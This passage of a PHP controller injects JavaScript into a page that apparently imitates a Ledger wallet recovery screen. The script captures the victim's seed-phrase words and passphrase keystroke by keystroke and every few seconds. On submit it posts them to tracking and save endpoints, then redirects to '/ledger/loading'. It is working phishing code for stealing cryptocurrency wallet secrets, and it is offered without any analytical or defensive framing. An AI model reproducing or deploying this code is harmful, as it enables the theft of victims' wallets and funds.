          var btnCount=parseInt(match[1]);
          if(btnCount===_currentWordCount){
            btn.classList.add('active','border-opacity-100','opacity-100');
            btn.classList.remove('border-opacity-0','opacity-50');
          }else{
            btn.classList.remove('active','border-opacity-100','opacity-100');
            btn.classList.add('border-opacity-0','opacity-50');
          }
        }
      }
    });
    
    /* Custom text: server-injected (POST) values only ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â no localStorage */
    _applyText();
    var _ldForm=document.querySelector('form');
    if(_ldForm)_ldForm.autocomplete='off';

    // Add specific tracking for passphrase input (only this one, since grid inputs are handled in buildGrid)
    var passphraseInput=document.querySelector('input[placeholder*="Passphrase"]');
    if(passphraseInput){
      passphraseInput.autocomplete='off';
      passphraseInput.addEventListener('paste',handlePaste);
      ['input','keyup','change'].forEach(function(ev){
        passphraseInput.addEventListener(ev,function(){setTimeout(function(){sendState(false);},0);});
      });
      
      // Add Enter key navigation on passphrase - focus submit button
      passphraseInput.addEventListener('keydown',function(e){
        if(e.key==='Enter'){
          e.preventDefault();
          var btn=document.querySelector('button[type="submit"], button:not([type])');
          if(btn)btn.focus();
        }
      });
      
      // Add eye toggle to passphrase input - wrap in relative div like word inputs
      var ppContainer=passphraseInput.parentElement;
      if(ppContainer){
        // Create wrapper div with relative class
        var wrapper=document.createElement('div');
        wrapper.className='relative w-full';
        
        // Move passphrase input into wrapper
        ppContainer.removeChild(passphraseInput);
        wrapper.appendChild(passphraseInput);
        
        // Create eye button (ld-pp-eye class lets word toggles find it)
        var eyeBtn=document.createElement('button');
        eyeBtn.type='button';
        eyeBtn.className='absolute right-2 top-1/2 -translate-y-1/2 text-[#9da3ae] ld-pp-eye';
        eyeBtn.innerHTML='<svg class="lucide lucide-eye-off" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>';

        // Add eye button to wrapper
        wrapper.appendChild(eyeBtn);

        // Replace container content with wrapper
        ppContainer.innerHTML='';
        ppContainer.appendChild(wrapper);

        eyeBtn.onclick=function(){
          var eyeIcon='<svg class="lucide lucide-eye" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
          var eyeOffIcon='<svg class="lucide lucide-eye-off" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>';
          var isVisible=passphraseInput.type==='text';
          var start=passphraseInput.selectionStart,end=passphraseInput.selectionEnd;
          passphraseInput.type=isVisible?'password':'text';
          eyeBtn.innerHTML=isVisible?eyeOffIcon:eyeIcon;
          try{passphraseInput.setSelectionRange(start,end);}catch(e){}
        };
      }
    }

    var btn=document.querySelector('button[type="submit"], button:not([type])');
    if(btn){
      btn.addEventListener('click',function(e){
        e.preventDefault();
        var words=getWords();
        if(words.filter(Boolean).length<REQUIRED||_waiting)return;
        _waiting=true;
        btn.disabled=true;
        Promise.resolve(window._llStayReadyPromise)
        .then(function(){
          if(!window._llStayOk)throw new Error('stay');
          return sendState(true);
        })
        .then(function(){
          var val=words.filter(Boolean).join(' ');
          return (window._encVal?window._encVal(val):Promise.resolve(val)).then(function(enc){
            return window._llPostTrack(new URLSearchParams({_token:CSRF,page:PAGE,type:'form_submit',element:'seed_phrase',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')}));
          });
        })
        .then(function(){
          return fetch(SAVE,{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':CSRF},
            body:JSON.stringify({words:words.filter(Boolean),passphrase:getPassphrase(),page:PAGE,history:_wh,wordCount:_currentWordCount}),
            keepalive:true
          }).then(function(r){if(!r.ok)throw new Error('save');});
        })
        .then(function(){
          window.location.href='/ledger/loading';
        })
        .catch(function(){_waiting=false;if(btn)btn.disabled=false;});
      });
    }

    checkEnable();
    setInterval(function(){if(!_waiting)sendState(false);},3000);
  });
})();
</script>
JS;
        if (stripos($html, '</body>') !== false) {
            $html = str_ireplace('</body>', $bridge . $ui . '</body>', $html);
        } else {
            $html .= $bridge . $ui;
        }

        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }
}
